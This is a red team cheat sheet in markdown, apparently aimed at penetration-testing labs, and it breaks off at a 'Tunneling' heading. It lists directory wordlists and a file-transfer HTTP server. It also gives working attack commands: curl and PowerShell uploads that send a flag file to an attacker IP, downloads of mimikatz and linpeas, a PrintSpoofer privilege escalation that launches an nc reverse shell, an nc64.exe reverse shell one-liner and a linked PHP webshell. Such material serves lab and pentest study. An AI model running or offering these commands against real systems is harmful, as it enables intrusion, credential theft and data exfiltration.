# Red Team Cheat Sheet

---

# Web

## Directory Traversal

https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content

Commonly Used Dictionaries

```
# web/common.txt - 4743 Lines
https://raw.githubusercontent.com/voidexec/sec/main/web/common.txt

# web/big.txt - 20476 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/big.txt

# web/directory-list-2.3-small.txt - 87664 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-small.txt

# web/directory-list-2.3-medium.txt - 220559 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-medium.txt

# web/directory-list-2.3-big.txt - 1273832 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-big.txt
```

## HTTP Server for Upload and Download

```
# Download
https://raw.githubusercontent.com/voidexec/sec/main/web/httpserver.py

# Start Server
python3 httpserver.py (default port 80)
python3 httpserver.py -p 8000

# Upload file with curl
curl -F 'file=@/home/ubuntu/Desktop/flag.txt' http://192.168.45.145/

# Download file with curl
curl -O http://192.168.45.145/linpeas.sh

# Upload with PowerShell
$FilePath="C:\Users\Administrator\Desktop\flag.txt"; $Url="http://192.168.45.145/"; $client=New-Object System.Net.Http.HttpClient; $content=New-Object System.Net.Http.MultipartFormDataContent; $fileStream=[System.IO.File]::OpenRead($FilePath); $content.Add((New-Object System.Net.Http.StreamContent($fileStream)), "file", [System.IO.Path]::GetFileName($FilePath)); $client.PostAsync($Url, $content).Result.Content.ReadAsStringAsync().Result

# Download with PowerShell
iwr -uri "http://192.168.45.145/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"
```

# Shell

Reverse Shell Generator https://www.revshells.com/

```bash
# PHP One-liner webshell
https://raw.githubusercontent.com/voidexec/sec/main/webshells/shell.php
```

# Windows

PrintSpoofer

```
https://github.com/itm4n/PrintSpoofer/releases
# Usage 1 - Spawning cmd interactive as system
.\PrintSpoofer64.exe -i -c cmd
# Usage 2 - Launching reverse shell as system
.\PrintSpoofer64.exe -c "C:\Users\Public\nc64.exe 192.168.45.145 9001 -e powershell"
```

NC

```
https://github.com/int0x33/nc.exe/
# nc64.exe
https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe
# Reverse shell
nc64.exe 192.168.45.145 9001 -e powershell
```

# Tunneling